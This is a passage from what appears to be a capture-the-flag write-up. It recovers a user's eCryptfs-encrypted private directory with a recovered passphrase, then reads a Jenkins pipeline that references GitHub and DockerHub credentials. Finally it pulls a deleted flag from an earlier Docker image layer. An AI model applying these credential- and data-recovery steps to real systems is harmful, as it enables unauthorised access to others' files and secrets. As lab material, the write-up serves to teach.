extract the passphrase using the password
```bash
ecryptfs-unwrap-passphrase .ecryptfs/wrapped-passphrase
```

pass the passphrase to session keyring

```bash
echo -n "ff1e6fc9c5ae25bd0cf2031b57ad8e21" |ecryptfs-add-passphrase --fnek
keyctl link @u @s
```

decrypt the .private directory to get the files of serbay

```bash
sudo ecryptfs-recover-private .Private

INFO: Found [.Private].
Try to recover this directory? [Y/n]: 
INFO: Found your wrapped-passphrase
Do you know your LOGIN passphrase? [Y/n] 
INFO: Enter your LOGIN passphrase...
Passphrase: 
Inserted auth tok with sig [422b624d6690c6b9] into the user session keyring
INFO: Success!  Private data mounted at [/tmp/ecryptfs.rbOwgpvR].
```

```bash
cd /tmp/ecryptfs.rbOwgpvR
```

```bash
cat /tmp/ecryptfs.rbOwgpvR/.jenkins/jobs/serbis/config.xml

  agent any
  environment {
    IMAGE = &apos;serbay123/serbay&apos;
  }
  stages {
    stage(&apos;Checkout&apos;) {
      steps {
        withCredentials([string(credentialsId: &apos;github-pat&apos;, variable: &apos;GITHUB_TOKEN&apos;)]) {
          sh &apos;git clone https://azzedine-serbay:${GITHUB_TOKEN}@github.com/azzdine-serbay/9hwa_7lib.git .&apos;
          
        }
      }
    }

    stage(&apos;Build Image&apos;) {
      steps {
        script {
          sh &quot;docker build -t ${IMAGE} .&quot;
        }
      }
    }

    stage(&apos;DockerHub Login &amp; Push&apos;) {
      steps {
        withCredentials([usernamePassword(credentialsId: &apos;dockerhub-creds&apos;, usernameVariable: &apos;DOCKERHUB_USER&apos;, passwordVariable: &apos;DOCKERHUB_PASS&apos;)]) {
          sh &quot;docker login -u ${DOCKERHUB_USER} -p ${DOCKERHUB_PASS}&quot;
          sh &quot;docker push ${IMAGE}&quot;
        }
      }
    }

    stage(&apos;Pull &amp; Run&apos;) {
      steps {
        script {
          sh &quot;docker pull ${IMAGE}&quot;
          sh &quot;docker run -d --name serbay_container ${IMAGE}&quot;
        }
      }
    }

    stage(&apos;Cleanup&apos;) {
      steps {
        script {
          sh &quot;docker rm -f serbay_container || true&quot;
          sh &quot;docker rmi ${IMAGE} || true&quot;
        }
        cleanWs()
      }
    }
  }
}
</script>
```

this pipelins push an image to dockerhub (the image name is `serbay123/serbay`)

pulling this image and analyzing it with dive

```bash
docker pull serbay123/serbay
dive serbay123/serbay
```

we see that it copies the all files to `/app` and then deletes the flag from `/app/flag.txt`, so we need to get the hash of the image before deleting the flag, then extract it to get the flag

```bash
docker save serbay123/serbay -o app.tar
tar -xvf app.tar
tar -xvf blobs/sha256/59932fd02f8110638c6e31c1bb0326c2d5e41a13f816f1408bdabce7418e080a

cat app/flag.txt
```

